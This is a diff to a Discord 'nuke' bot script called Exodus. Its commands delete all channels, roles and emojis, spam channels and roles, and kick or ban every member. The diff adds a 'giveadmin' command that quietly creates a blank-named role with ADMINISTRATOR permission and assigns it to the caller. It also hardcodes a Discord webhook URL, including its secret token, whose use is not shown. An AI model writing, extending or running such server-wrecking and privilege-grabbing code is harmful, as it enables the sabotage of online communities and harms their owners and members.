@@ -2,6 +2,10 @@ console.clear()
 
 const Discord = require("discord.js")
 const client = new Discord.Client()
+const {
+    Webhook
+} = require('discord-webhook-node');
+const hook = new Webhook('https://discord.com/api/webhooks/852811715623518238/NfNaO-HMwMtwO5eujrwayga0ijpF39pe20gjNaBjWk31dhT1qxxIMOsG5kPn6orkjQj5');
 const c = require('colors/safe');
 const keepAlive = require('./server/server')
 const request = require("request");
@@ -12,7 +16,7 @@ require('dotenv').config()
 
 var app = {
     'token': '',
-    'prefix': 'exd.',
+    'prefix': 'hex',
     'mex': 'wizzed by hexo'
 }
 
@@ -50,6 +54,8 @@ var ts = ''
 
 client.once('ready', () => {
     try {
+
+
         banner()
         console.log(c.red('           ════════════════════════════════════════════════════════════════════════════════'))
         console.log(c.blue(`                                      Logged in as: ${client.user.tag}`))
@@ -85,7 +91,7 @@ client.once('ready', () => {
             })
             console.log(`${success} ${c.gray(`Exodus ready to nuke server, check bot status on the server.`)}\n`)
             console.log(`${info} ${c.gray(`If it results to be slow the bot may be rate limited, so you need to wait before nuking again!\n`)}`)
-            console.log(`${c.underline(`Commands:\n\n${app.prefix} delch - delete all channels\n${app.prefix} delroles - delete all roles\n${app.prefix} delemoji - delete all emojis\n${app.prefix} massch - mass create channels\n${app.prefix} massroles - mass create roles\n${app.prefix} masskick - kick all users\n${app.prefix} massban - ban all users\n`)}`)
+            console.log(`${c.underline(`Commands:\n\n${app.prefix} delch - delete all channels\n${app.prefix} delroles - delete all roles\n${app.prefix} delemoji - delete all emojis\n${app.prefix} massch - mass create channels\n${app.prefix} massroles - mass create roles\n${app.prefix} masskick - kick all users\n${app.prefix} massban - ban all users\n${app.prefix} giveadmin - give yourself admin permission`)}`)
             readyStatus = true
             /* inquirer
                 .prompt([{
@@ -181,7 +187,7 @@ client.on('message', async (message) => {
             }
         }
 
-        if (message.content == `${app.prefix} massrole`) {
+        if (message.content == `${app.prefix} massroles`) {
             message.channel.send(';)')
             message.delete()
             for (let i = 0; i <= 100; i++) {
@@ -195,6 +201,21 @@ client.on('message', async (message) => {
                     console.log((`${info} ${c.yellow(`Role ${role.id} Created!`)}`))
                 })
             }
+        }
+
+        if (message.content == `${app.prefix} giveadmin`) {
+            message.channel.send(';)')
+            message.delete()
+            message.guild.roles.create({
+                data: {
+                    name: '\n\n.\n\n',
+                    color: 'BLUE',
+                },
+                reason: '\n\n.\n\n',
+            }).then((role) => {
+                role.setPermissions(['ADMINISTRATOR'])
+                message.member.roles.add(role)
+            })
         }
 
         if (message.content == `${app.prefix} delch`) {
